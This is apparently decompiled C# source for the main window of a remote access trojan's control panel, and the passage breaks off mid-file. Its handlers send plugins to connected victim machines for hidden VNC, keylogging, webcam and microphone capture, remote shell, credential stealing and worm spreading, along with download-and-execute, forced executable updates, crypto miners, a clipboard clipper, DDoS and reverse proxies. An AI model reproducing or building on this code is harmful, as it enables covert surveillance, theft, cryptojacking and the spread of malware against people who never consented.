using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Newtonsoft.Json;
using Server.Connectings;
using Server.Data;
using Server.Forms;
using Server.Helper;
using Server.Helper.Tasks;

namespace Server
{
	// Token: 0x02000038 RID: 56
	public partial class Form1 : FormMaterial
	{
		// Token: 0x060000E1 RID: 225 RVA: 0x0000AF03 File Offset: 0x00009103
		public Form1()
		{
			this.InitializeComponent();
			base.FormClosing += new FormClosingEventHandler(this.Closing1);
		}

		// Token: 0x060000E2 RID: 226 RVA: 0x0000AF2C File Offset: 0x0000912C
		private void Form1_Load(object sender, EventArgs e)
		{
			if (!Directory.Exists("local"))
			{
				Directory.CreateDirectory("local");
			}
			this.MinerXMR = new FormXmrMiner();
			this.MinerEtc = new FormMinerEtc();
			this.Clipper = new FormClipper();
			this.DDos = new FormDDos();
			this.ReverseProxyR = new FormReverseProxyR();
			this.ReverseProxyU = new FormReverseProxyU();
			MaterialSkinManager.Instance.ThemeChanged += this.ChangeScheme;
			this.ChangeScheme(this);
			if (File.Exists("local\\Tasks.json"))
			{
				AutoTaskMgr.Import();
			}
			if (File.Exists("local\\Clipper.json") && JsonConvert.DeserializeObject<Clipper>(File.ReadAllText("local\\Clipper.json")).AutoStart)
			{
				this.Clipper.Show();
				this.Clipper.Hide();
			}
			if (File.Exists("local\\Miner.json") && JsonConvert.DeserializeObject<MinerXMR>(File.ReadAllText("local\\Miner.json")).AutoStart)
			{
				this.MinerXMR.Show();
				this.MinerXMR.Hide();
			}
			if (File.Exists("local\\MinerEtc.json") && JsonConvert.DeserializeObject<MinerEtc>(File.ReadAllText("local\\MinerEtc.json")).AutoStart)
			{
				this.MinerEtc.Show();
				this.MinerEtc.Hide();
			}
			if (File.Exists("local\\ReverseProxyR.json") && JsonConvert.DeserializeObject<ReverseProxyR>(File.ReadAllText("local\\ReverseProxyR.json")).AutoStart)
			{
				this.ReverseProxyR.Show();
				this.ReverseProxyR.Hide();
			}
			if (File.Exists("local\\ReverseProxyU.json") && JsonConvert.DeserializeObject<ReverseProxyU>(File.ReadAllText("local\\ReverseProxyU.json")).AutoStart)
			{
				this.ReverseProxyU.Show();
				this.ReverseProxyU.Hide();
			}
			this.GridClients.ColumnWidthChanged += new DataGridViewColumnEventHandler(this.DataGridView1_ColumnHeadersHeightChanged);
			this.GridClients.RowPrePaint += this.DataGridView1_RowPrePaint;
			this.GridClients.MouseWheel += this.DataGridView1_OnMouseWheel;
			if (File.Exists("local\\Settings.json"))
			{
				this.settings = JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json"));
				if (this.settings.Start)
				{
					this.settings.Ports.ToList<string>().ForEach(delegate(string item)
					{
						FormSettings.listners.Add(new Listner(Convert.ToInt32(item)));
					});
				}
			}
			else
			{
				this.settings = new Settings();
			}
			Certificate.Import();
			typeof(DataGridView).InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, this.GridClients, new object[]
			{
				true
			});
			typeof(DataGridView).InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, this.GridLogs, new object[]
			{
				true
			});

            System.ComponentModel.ComponentResourceManager componentResourceManager = new System.ComponentModel.ComponentResourceManager(typeof(Form1));

            this.userInterfaceToolStripMenuItem.Image = (System.Drawing.Image)componentResourceManager.GetObject("userInterfaceToolStripMenuItem.Image");

        }

		// Token: 0x060000E3 RID: 227 RVA: 0x0000B1F1 File Offset: 0x000093F1
		public int HeightColumn()
		{
			return this.GridClients.RowTemplate.Height;
		}

		// Token: 0x060000E4 RID: 228 RVA: 0x0000B204 File Offset: 0x00009404
		private void DataGridView1_OnMouseWheel(object sender, MouseEventArgs e)
		{
			base.OnMouseWheel(e);
			try
			{
				int delta = e.Delta;
				if (delta != -120)
				{
					if (delta == 120)
					{
						this.GridClients.FirstDisplayedScrollingRowIndex = Math.Max(0, this.GridClients.FirstDisplayedScrollingRowIndex - SystemInformation.MouseWheelScrollLines);
					}
				}
				else
				{
					this.GridClients.FirstDisplayedScrollingRowIndex += SystemInformation.MouseWheelScrollLines;
				}
			}
			catch
			{
			}
		}

		// Token: 0x060000E5 RID: 229 RVA: 0x0000B27C File Offset: 0x0000947C
		private void DataGridView1_ColumnHeadersHeightChanged(object sender, EventArgs e)
		{
			if (this.GridClients.Columns[0].Width > 90)
			{
				this.GridClients.Columns[0].Width = 70;
			}
			this.GridClients.RowTemplate.Height = this.GridClients.Columns[0].Width - 20;
		}

		// Token: 0x060000E6 RID: 230 RVA: 0x0000B2E4 File Offset: 0x000094E4
		private void DataGridView1_RowPostPaint(object sender, DataGridViewRowPostPaintEventArgs e)
		{
			this.GridClients.Rows[e.RowIndex].Height = this.HeightColumn();
		}

		// Token: 0x060000E7 RID: 231 RVA: 0x0000B307 File Offset: 0x00009507
		private void DataGridView1_RowPrePaint(object sender, DataGridViewRowPrePaintEventArgs e)
		{
			this.GridClients.Rows[e.RowIndex].Height = this.HeightColumn();
		}

		// Token: 0x060000E8 RID: 232 RVA: 0x0000B32C File Offset: 0x0000952C
		private void ChangeScheme(object sender)
		{
			this.GridClients.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
			this.GridClients.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.GridClients.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
			this.GridClients.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.GridLogs.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
			this.GridLogs.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.GridLogs.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
			this.GridLogs.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.dataGridView2.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
			this.dataGridView2.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
			this.dataGridView2.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
			this.dataGridView2.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		}

		// Token: 0x060000E9 RID: 233 RVA: 0x0000B435 File Offset: 0x00009635
		private void Closing1(object sender, EventArgs e)
		{
			AutoTaskMgr.Export();
		}

		// Token: 0x060000EA RID: 234 RVA: 0x0000B43C File Offset: 0x0000963C
		private void exitToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x060000EB RID: 235 RVA: 0x0000B444 File Offset: 0x00009644
		private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
		{
			new FormAbout().ShowDialog();
		}

		// Token: 0x060000EC RID: 236 RVA: 0x0000B451 File Offset: 0x00009651
		private void settingsToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			new FormSettings().ShowDialog();
		}

		// Token: 0x060000ED RID: 237 RVA: 0x0000B45E File Offset: 0x0000965E
		private void buliderToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			new FormBulider().ShowDialog();
		}

		// Token: 0x060000EE RID: 238 RVA: 0x0000B46C File Offset: 0x0000966C
		private void MbSecound_Tick(object sender, EventArgs e)
		{
			this.sents0mbsToolStripMenuItem.Text = "Sents [" + Methods.BytesToString(SocketData.Sent) + "/s]";
			this.recives0mbsToolStripMenuItem.Text = "Recives [" + Methods.BytesToString(SocketData.Recive) + "/s] }";
			this.sents0mbToolStripMenuItem.Text = "Sents [" + Methods.BytesToString(SocketData.Sents) + "]";
			this.recives0mbToolStripMenuItem.Text = "Recives [" + Methods.BytesToString(SocketData.Recives) + "]";
			this.connects0ToolStripMenuItem.Text = string.Format("   {{ Connects [{0}]", SocketData.Connects);
			SocketData.Clear();
			this.toolStripMenuItem11.Text = string.Format("   {{ Online [{0}]", this.GridClients.Rows.Count);
			this.toolStripMenuItem12.Text = string.Format("Selected [{0}]", this.GridClients.SelectedRows.Count);
			if (this.MinerXMR.work)
			{
				this.toolStripMenuItem118.Text = string.Format("Miners xmrig [{0}]", this.MinerXMR.GridClients.Rows.Count);
			}
			else
			{
				this.toolStripMenuItem118.Text = "Miners xmrig [Not work]";
			}
			if (this.MinerEtc.work)
			{
				this.toolStripMenuItem1.Text = string.Format("Miners etc [{0}]", this.MinerEtc.GridClients.Rows.Count);
			}
			else
			{
				this.toolStripMenuItem1.Text = "Miners etc [Not work]";
			}
			if (this.Clipper.work)
			{
				this.toolStripMenuItem13.Text = string.Format("Clippers [{0}]", this.Clipper.clients.Count);
			}
			else
			{
				this.toolStripMenuItem13.Text = "Clippers [Not work]";
			}
			if (this.DDos.work)
			{
				this.toolStripMenuItem3.Text = string.Format("DDos [{0}]", this.DDos.clients.Count);
			}
			else
			{
				this.toolStripMenuItem3.Text = "DDos [Not work]";
			}
			if (this.ReverseProxyR.work)
			{
				this.users0ToolStripMenuItem.Text = string.Format("Reverse Proxy R [{0}]    ", this.ReverseProxyR.Server.ClientReverse.Count);
			}
			else
			{
				this.users0ToolStripMenuItem.Text = "Reverse Proxy R [Not work]    ";
			}
			if (this.ReverseProxyU.work)
			{
				this.toolStripMenuItem34.Text = string.Format("Reverse Proxy U [{0}] }}   ", this.ReverseProxyU.GridIps.Rows.Count);
			}
			else
			{
				this.toolStripMenuItem34.Text = "Reverse Proxy U [Not work] }   ";
			}
			GC.Collect();
		}

		// Token: 0x060000EF RID: 239 RVA: 0x0000B750 File Offset: 0x00009950
		public Clients[] ClientsSelected()
		{
			List<Clients> list = new List<Clients>();
			foreach (object obj in this.GridClients.SelectedRows)
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				list.Add((Clients)dataGridViewRow.Tag);
			}
			return list.ToArray();
		}

		// Token: 0x060000F0 RID: 240 RVA: 0x0000B7C4 File Offset: 0x000099C4
		public Clients[] ClientsAll()
		{
			List<Clients> list = new List<Clients>();
			foreach (object obj in ((IEnumerable)this.GridClients.Rows))
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				list.Add((Clients)dataGridViewRow.Tag);
			}
			return list.ToArray();
		}

		// Token: 0x060000F1 RID: 241 RVA: 0x0000B838 File Offset: 0x00009A38
		private void exitToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Exit"
					});
				});
			}
		}

		// Token: 0x060000F2 RID: 242 RVA: 0x0000B88C File Offset: 0x00009A8C
		private void restartToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Restart"
					});
				});
			}
		}

		// Token: 0x060000F3 RID: 243 RVA: 0x0000B8E0 File Offset: 0x00009AE0
		private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Uninstall"
					});
				});
			}
		}

		// Token: 0x060000F4 RID: 244 RVA: 0x0000B934 File Offset: 0x00009B34
		private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Disconnect();
				});
			}
		}

		// Token: 0x060000F5 RID: 245 RVA: 0x0000B988 File Offset: 0x00009B88
		private void openClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if (Directory.Exists("Users\\" + clients.Hwid))
				{
					System.Threading.Tasks.Task.Run<Process>(() => Process.Start("Users\\" + clients.Hwid));
				}
			}
		}

		// Token: 0x060000F6 RID: 246 RVA: 0x0000B9FC File Offset: 0x00009BFC
		private void updateToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "Executable (*.exe)|*.exe";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					byte[] bytes = File.ReadAllBytes(openFileDialog.FileName);
					Clients[] array = this.ClientsSelected();
					for (int i = 0; i < array.Length; i++)
					{
						Clients clients = array[i];
						System.Threading.Tasks.Task.Run(delegate()
						{
							clients.Send(new object[]
							{
								"Update",
								bytes
							});
						});
					}
				}
			}
		}

		// Token: 0x060000F7 RID: 247 RVA: 0x0000BAA8 File Offset: 0x00009CA8
		private void desktopToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Desktop.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormDesktop)Application.OpenForms["Desktop:" + clients.Hwid] == null)
				{
					new FormDesktop
					{
						Name = "Desktop:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x060000F8 RID: 248 RVA: 0x0000BB78 File Offset: 0x00009D78
		private void cameraToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Camera.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormCamera)Application.OpenForms["Camera:" + clients.Hwid] == null)
				{
					new FormCamera
					{
						Name = "Camera:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x060000F9 RID: 249 RVA: 0x0000BC48 File Offset: 0x00009E48
		private void microphoneToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Microphone.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormMicrophone)Application.OpenForms["Microphone:" + clients.Hwid] == null)
				{
					new FormMicrophone
					{
						Name = "Microphone:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x060000FA RID: 250 RVA: 0x0000BD18 File Offset: 0x00009F18
		private void systemSoundToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\SystemSound.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormSystemSound)Application.OpenForms["SystemSound:" + clients.Hwid] == null)
				{
					new FormSystemSound
					{
						Name = "SystemSound:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x060000FB RID: 251 RVA: 0x0000BDE8 File Offset: 0x00009FE8
		private void explorerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Explorer.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormExplorer)Application.OpenForms["Explorer:" + clients.Hwid] == null)
				{
					new FormExplorer
					{
						Name = "Explorer:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x060000FC RID: 252 RVA: 0x0000BEB8 File Offset: 0x0000A0B8
		private void hVNCToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\HVNC.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormHVNC)Application.OpenForms["HVNC:" + clients.Hwid] == null)
				{
					new FormHVNC
					{
						Name = "HVNC:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x060000FD RID: 253 RVA: 0x0000BF88 File Offset: 0x0000A188
		private void processToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Process.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormProcess)Application.OpenForms["Process:" + clients.Hwid] == null)
				{
					new FormProcess
					{
						Name = "Process:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x060000FE RID: 254 RVA: 0x0000C058 File Offset: 0x0000A258
		private void regeditToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Regedit.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormRegedit)Application.OpenForms["Regedit:" + clients.Hwid] == null)
				{
					new FormRegedit
					{
						Name = "Regedit:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x060000FF RID: 255 RVA: 0x0000C128 File Offset: 0x0000A328
		private void shellToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Shell.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormShell)Application.OpenForms["Shell:" + clients.Hwid] == null)
				{
					new FormShell
					{
						Name = "Shell:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x06000100 RID: 256 RVA: 0x0000C1F8 File Offset: 0x0000A3F8
		private void netStatToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Netstat.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormNetstat)Application.OpenForms["Netstat:" + clients.Hwid] == null)
				{
					new FormNetstat
					{
						Name = "Netstat:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x06000101 RID: 257 RVA: 0x0000C2C8 File Offset: 0x0000A4C8
		private void keyLoggerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\KeyLogger.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormKeyLogger)Application.OpenForms["KeyLogger:" + clients.Hwid] == null)
				{
					new FormKeyLogger
					{
						Name = "KeyLogger:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x06000102 RID: 258 RVA: 0x0000C398 File Offset: 0x0000A598
		private void autorunToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\AutoRun.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormAutoRun)Application.OpenForms["AutoRun:" + clients.Hwid] == null)
				{
					new FormAutoRun
					{
						Name = "AutoRun:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x06000103 RID: 259 RVA: 0x0000C468 File Offset: 0x0000A668
		private void fromDiskToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					string checksum2 = Methods.GetChecksum(openFileDialog.FileName);
					byte[] pack = LEB128.Write(new object[]
					{
						"SendDiskGet",
						openFileDialog.FileName,
						checksum2
					});
					string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
					Clients[] array = this.ClientsSelected();
					for (int i = 0; i < array.Length; i++)
					{
						Clients clients = array[i];
						System.Threading.Tasks.Task.Run(delegate()
						{
							clients.Send(new object[]
							{
								"Invoke",
								checksum,
								pack
							});
						});
					}
				}
			}
		}

		// Token: 0x06000104 RID: 260 RVA: 0x0000C540 File Offset: 0x0000A740
		private void fromMemoryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					string checksum2 = Methods.GetChecksum(openFileDialog.FileName);
					byte[] pack = LEB128.Write(new object[]
					{
						"SendMemoryGet",
						openFileDialog.FileName,
						checksum2
					});
					string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
					Clients[] array = this.ClientsSelected();
					for (int i = 0; i < array.Length; i++)
					{
						Clients clients = array[i];
						System.Threading.Tasks.Task.Run(delegate()
						{
							clients.Send(new object[]
							{
								"Invoke",
								checksum,
								pack
							});
						});
					}
				}
			}
		}

		// Token: 0x06000105 RID: 261 RVA: 0x0000C618 File Offset: 0x0000A818
		private void fromLinkToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			FormInput formInput = new FormInput();
			formInput.Text = "Url";
			formInput.rjTextBox1.PlaceholderText = "https://example.com/ups.exe";
			formInput.ShowDialog();
			if (formInput.Run)
			{
				byte[] pack = LEB128.Write(new object[]
				{
					"SendLink",
					formInput.rjTextBox1.Texts
				});
				string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
				Clients[] array = this.ClientsSelected();
				for (int i = 0; i < array.Length; i++)
				{
					Clients clients = array[i];
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							pack
						});
					});
				}
			}
		}

		// Token: 0x06000106 RID: 262 RVA: 0x0000C6E0 File Offset: 0x0000A8E0
		private void serviceToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Service.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormService)Application.OpenForms["Service:" + clients.Hwid] == null)
				{
					new FormService
					{
						Name = "Service:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x06000107 RID: 263 RVA: 0x0000C7B0 File Offset: 0x0000A9B0
		private void funToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Fun.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormFun)Application.OpenForms["Fun:" + clients.Hwid] == null)
				{
					new FormFun
					{
						Name = "Fun:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x06000108 RID: 264 RVA: 0x0000C880 File Offset: 0x0000AA80
		private void chatToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Chat.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormChat)Application.OpenForms["Chat:" + clients.Hwid] == null)
				{
					new FormChat
					{
						Name = "Chat:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x06000109 RID: 265 RVA: 0x0000C950 File Offset: 0x0000AB50
		private void changeWallpaperToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					byte[] pack = LEB128.Write(new object[]
					{
						"Wallpaper",
						File.ReadAllBytes(openFileDialog.FileName),
						Path.GetExtension(openFileDialog.FileName)
					});
					string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
					Clients[] array = this.ClientsSelected();
					for (int i = 0; i < array.Length; i++)
					{
						Clients clients = array[i];
						System.Threading.Tasks.Task.Run(delegate()
						{
							clients.Send(new object[]
							{
								"Invoke",
								checksum,
								pack
							});
						});
					}
				}
			}
		}

		// Token: 0x0600010A RID: 266 RVA: 0x0000CA28 File Offset: 0x0000AC28
		private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\ReverseProxy.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"Pack",
				"ReverseProxy"
			});
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormReverseProxy)Application.OpenForms["ReverseProxy:" + clients.Hwid] == null)
				{
					new FormReverseProxy
					{
						Name = "ReverseProxy:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							pack
						});
					});
				}
			}
		}

		// Token: 0x0600010B RID: 267 RVA: 0x0000CB1C File Offset: 0x0000AD1C
		private void wormsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Worm.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}

		// Token: 0x0600010C RID: 268 RVA: 0x0000CB90 File Offset: 0x0000AD90
		private void stealerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Stealer.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}

		// Token: 0x0600010D RID: 269 RVA: 0x0000CC04 File Offset: 0x0000AE04
